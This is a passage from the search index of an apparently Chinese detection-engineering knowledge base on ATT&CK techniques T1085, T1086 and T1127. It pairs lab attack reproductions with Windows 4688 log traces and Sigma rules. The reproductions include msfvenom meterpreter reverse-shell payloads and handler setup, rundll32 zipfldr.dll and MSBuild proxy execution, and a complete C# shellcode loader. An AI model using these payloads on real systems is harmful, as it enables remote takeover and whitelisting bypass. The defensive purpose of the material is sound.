\u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#payloaddll","text":"root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp -b '\\x00\\x0b' LHOST=192.168.126.146 LPORT=4444 -f exe > shell.exe","title":"\u751f\u6210payload.dll"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > set AutoRunScript migrate f AutoRunScript => migrate f msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#payload","text":"rundll32.exe zipfldr.dll,RouteTheCall .\\shell.exe #shell.exe\u5b58\u653e\u8def\u5f84\u4e0b\u6267\u884c","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 6 opened (192.168.126.146:4444 -> 192.168.126.156:49176) at 2020-04-13 10:54:22 +0800 [*] Session ID 6 (192.168.126.146:4444 -> 192.168.126.156:49176) processing AutoRunScript 'migrate f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] meterpreter > getuid Server username: WIN-IFPMACUK8BT\\Administrator","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_7","text":"\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u8fdb\u7a0b\u4fe1\u606f: #4688-1 \u65b0\u8fdb\u7a0b ID:0x918 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\rundll32.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x948 \u8fdb\u7a0b\u547d\u4ee4\u884c:rundll32.exe zipfldr.dll,RouteTheCall .\\shell.exe \u8fdb\u7a0b\u4fe1\u606f: #4688-2 \u65b0\u8fdb\u7a0b ID:0x94c \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Users\\Administrator\\Desktop\\a\\shell.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x918 \u8fdb\u7a0b\u547d\u4ee4\u884c:\"C:\\Users\\Administrator\\Desktop\\a\\shell.exe\"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#sigma","text":"title: \u53ef\u7591Rundll32\u6d3b\u52a8 description: \u57fa\u4e8e\u53c2\u6570\u68c0\u6d4b\u4e0erundll32\u76f8\u5173\u7684\u53ef\u7591\u8fdb\u7a0b status: experimental references: - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/ - https://twitter.com/Hexacorn/status/885258886428725250 - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 tags: - attack.defense_evasion - attack.execution - attack.t1085 logsource: category: process_creation product: windows detection: selection: CommandLine: - '*\\rundll32.exe* url.dll,*OpenURL *' - '*\\rundll32.exe* url.dll,*OpenURLA *' - '*\\rundll32.exe* url.dll,*FileProtocolHandler *' - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *' - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *' - '*\\rundll32.exe javascript:*' - '* url.dll,*OpenURL *' - '* url.dll,*OpenURLA *' - '* url.dll,*FileProtocolHandler *' - '* zipfldr.dll,*RouteTheCall *' - '* Shell32.dll,*Control_RunDLL *' - '* javascript:*' - '*.RegisterXLL*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1085 https://attack.mitre.org/techniques/T1085/ \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/","text":"T1086-windows-powerhsell \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u4ee3\u7801\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u7f51\u7edc\u4e0a\u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4/\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\u516c\u5f00\u7684PowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528powershell.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6a21\u62df\u573a\u666f\uff1a\u653b\u51fb\u8005\u901a\u8fc7\u5176\u89c6\u56fe\u7a97\u53e3\u6253\u5f00powershell \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID4688 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: T1086 \u975e\u4ea4\u4e92\u5f0fPowerShell description: \u901a\u8fc7\u5c06powershell.exe\u4ee5explorer.exe\u4f5c\u4e3a\u7236\u7ea7\uff0c\u6765\u68c0\u6d4b\u975e\u4ea4\u4e92\u5f0fPowerShell\u6d3b\u52a8\u3002 status: experimental author: 12306Bro references: \u65e0 logsource: product: windows service: security detection: selection: EventID: 4688 NewProcessName: '*\\powershell.exe' ParentProcessName: '*\\explorer.exe' condition: selection falsepositives: - Unknown level: critical \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1086 https://attack.mitre.org/techniques/T1086/","title":"T1086-windows-powerhsell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#t1086-windows-powerhsell","text":"","title":"T1086-windows-powerhsell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#attck","text":"PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u4ee3\u7801\u3002 PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002 \u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u7f51\u7edc\u4e0a\u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\u548cPSAttack\u3002 \u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4/\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\u516c\u5f00\u7684PowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528powershell.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_1","text":"\u6a21\u62df\u573a\u666f\uff1a\u653b\u51fb\u8005\u901a\u8fc7\u5176\u89c6\u56fe\u7a97\u53e3\u6253\u5f00powershell","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID4688","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#sigma","text":"title: T1086 \u975e\u4ea4\u4e92\u5f0fPowerShell description: \u901a\u8fc7\u5c06powershell.exe\u4ee5explorer.exe\u4f5c\u4e3a\u7236\u7ea7\uff0c\u6765\u68c0\u6d4b\u975e\u4ea4\u4e92\u5f0fPowerShell\u6d3b\u52a8\u3002 status: experimental author: 12306Bro references: \u65e0 logsource: product: windows service: security detection: selection: EventID: 4688 NewProcessName: '*\\powershell.exe' ParentProcessName: '*\\explorer.exe' condition: selection falsepositives: - Unknown level: critical","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_7","text":"MITRE-ATT&CK-T1086 https://attack.mitre.org/techniques/T1086/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T1127-win-\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 MSBuild.exe\uff08Microsoft Build Engine\uff09\u662fVisual Studio\u4f7f\u7528\u7684\u8f6f\u4ef6\u6784\u5efa\u5e73\u53f0\u3002\u5b83\u91c7\u7528XML\u683c\u5f0f\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u5b9a\u4e49\u4e86\u5404\u79cd\u5e73\u53f0\u7684\u6784\u5efa\u8981\u6c42\u548c\u914d\u7f6e\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528MSBuild\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002.NET 4\u4e2d\u5f15\u5165\u7684MSBuild\u5185\u8054\u4efb\u52a1\u529f\u80fd\u5141\u8bb8\u5c06C\uff03\u4ee3\u7801\u63d2\u5165\u5230XML\u9879\u76ee\u6587\u4ef6\u4e2d\u3002\u5185\u8054\u4efb\u52a1MSBuild\u5c06\u7f16\u8bd1\u5e76\u6267\u884c\u5185\u8054\u4efb\u52a1\u3002MSBuild.exe\u662f\u4e00\u4e2a\u7b7e\u540d\u7684\u5fae\u8f6f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u56e0\u6b64\u5f53\u5b83\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u7528\u65f6\uff0c\u5b83\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u5e76\u7ed5\u8fc7\u914d\u7f6e\u4e3a\u5141\u8bb8MSBuild.exe\u6267\u884c\u7684\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u3002 \u6d4b\u8bd5\u6848\u4f8b MSBuild \u662f Microsoft Build Engine \u7684\u7f29\u5199\uff0c\u4ee3\u8868 Microsoft \u548c Visual Studio\u7684\u65b0\u7684\u751f\u6210\u5e73\u53f0\u3002MSBuild\u5728\u5982\u4f55\u5904\u7406\u548c\u751f\u6210\u8f6f\u4ef6\u65b9\u9762\u662f\u5b8c\u5168\u900f\u660e\u7684\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5728\u672a\u5b89\u88c5Visual Studio\u7684\u751f\u6210\u5b9e\u9a8c\u5ba4\u73af\u5883\u4e2d\u7ec4\u7ec7\u548c\u751f\u6210\u4ea7\u54c1\u3002 MSBuild \u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u57fa\u4e8e XML\u7684\u9879\u76ee\u6587\u4ef6\u683c\u5f0f\uff0c\u8fd9\u79cd\u683c\u5f0f\u5bb9\u6613\u7406\u89e3\u3001\u6613\u4e8e\u6269\u5c55\u5e76\u4e14\u5b8c\u5168\u53d7 Microsoft \u652f\u6301\u3002MSBuild\u9879\u76ee\u6587\u4ef6\u7684\u683c\u5f0f\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5145\u5206\u63cf\u8ff0\u54ea\u4e9b\u9879\u9700\u8981\u751f\u6210\uff0c\u4ee5\u53ca\u5982\u4f55\u5229\u7528\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u914d\u7f6e\u751f\u6210\u8fd9\u4e9b\u9879\u3002 \u8bf4\u660e\uff1aMsbuild.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsbuild\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09\u636e\u79f0\u53ef\u4ee5\u7ed5\u8fc7360\uff0c\u5f85\u786e\u8ba4 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u6d4b\u8bd5\u8fc7\u7a0b MSF\u751f\u6210\u8f7d\u8377 msfvenom -a x86 \u2013platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp XML\u6587\u4ef6\u8bbe\u7f6e <Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"> <!-- This inline task executes shellcode. --> <!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj --> <!-- Save This File And Execute The Above Command --> <!-- Author: Casey Smith, Twitter: @subTee --> <!-- License: BSD 3-Clause --> <Target Name=\"Hello\"> <ClassExample /> </Target> <UsingTask TaskName=\"ClassExample\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" > <Task> <Code Type=\"Class\" Language=\"cs\"> <![CDATA[ using System; using System.Runtime.InteropServices; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask { private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); public override bool Execute() { byte[] shellcode = new byte[] { \u4f60\u7684payload}; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return true; } } ]]> </Code> </Task> </UsingTask> </Project> \u8bbe\u7f6e\u76d1\u542c use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe file.xml \u67e5\u770b\u4f1a\u8bdd \u6d4b\u8bd5\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1127 https://attack.mitre.org/techniques/T1127/ \u5229\u7528msbuild.exe\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u767d\u540d\u5355\u5b89\u5168\u673a\u5236\u7684\u591a\u79cd\u59ff\u52bf https://www.freebuf.com/articles/network/197706.html GreatSCT|MSF|\u767d\u540d\u5355 http://www.secist.com/archives/6082.html \u5bf9\u4eae\u795e\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload\u7b2c\u4e00\u5b63\u590d\u73b0 https://blog.csdn.net/ws13129/article/details/89736941 \u68c0\u6d4b\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload https://blog.csdn.net/qq_36334464/article/details/105487176 \u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload https://www.jianshu.com/p/cdb1867c6abb","title":"T1127-win-\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#t1127-win-msbuildexepayload","text":"","title":"T1127-win-\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"MSBuild.exe\uff08Microsoft Build Engine\uff09\u662fVisual Studio\u4f7f\u7528\u7684\u8f6f\u4ef6\u6784\u5efa\u5e73\u53f0\u3002\u5b83\u91c7\u7528XML\u683c\u5f0f\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u5b9a\u4e49\u4e86\u5404\u79cd\u5e73\u53f0\u7684\u6784\u5efa\u8981\u6c42\u548c\u914d\u7f6e\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528MSBuild\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002.NET 4\u4e2d\u5f15\u5165\u7684MSBuild\u5185\u8054\u4efb\u52a1\u529f\u80fd\u5141\u8bb8\u5c06C\uff03\u4ee3\u7801\u63d2\u5165\u5230XML\u9879\u76ee\u6587\u4ef6\u4e2d\u3002\u5185\u8054\u4efb\u52a1MSBuild\u5c06\u7f16\u8bd1\u5e76\u6267\u884c\u5185\u8054\u4efb\u52a1\u3002MSBuild.exe\u662f\u4e00\u4e2a\u7b7e\u540d\u7684\u5fae\u8f6f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u56e0\u6b64\u5f53\u5b83\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u7528\u65f6\uff0c\u5b83\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u5e76\u7ed5\u8fc7\u914d\u7f6e\u4e3a\u5141\u8bb8MSBuild.exe\u6267\u884c\u7684\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"MSBuild \u662f Microsoft Build Engine \u7684\u7f29\u5199\uff0c\u4ee3\u8868 Microsoft \u548c Visual Studio\u7684\u65b0\u7684\u751f\u6210\u5e73\u53f0\u3002MSBuild\u5728\u5982\u4f55\u5904\u7406\u548c\u751f\u6210\u8f6f\u4ef6\u65b9\u9762\u662f\u5b8c\u5168\u900f\u660e\u7684\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5728\u672a\u5b89\u88c5Visual Studio\u7684\u751f\u6210\u5b9e\u9a8c\u5ba4\u73af\u5883\u4e2d\u7ec4\u7ec7\u548c\u751f\u6210\u4ea7\u54c1\u3002 MSBuild \u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u57fa\u4e8e XML\u7684\u9879\u76ee\u6587\u4ef6\u683c\u5f0f\uff0c\u8fd9\u79cd\u683c\u5f0f\u5bb9\u6613\u7406\u89e3\u3001\u6613\u4e8e\u6269\u5c55\u5e76\u4e14\u5b8c\u5168\u53d7 Microsoft \u652f\u6301\u3002MSBuild\u9879\u76ee\u6587\u4ef6\u7684\u683c\u5f0f\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5145\u5206\u63cf\u8ff0\u54ea\u4e9b\u9879\u9700\u8981\u751f\u6210\uff0c\u4ee5\u53ca\u5982\u4f55\u5229\u7528\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u914d\u7f6e\u751f\u6210\u8fd9\u4e9b\u9879\u3002 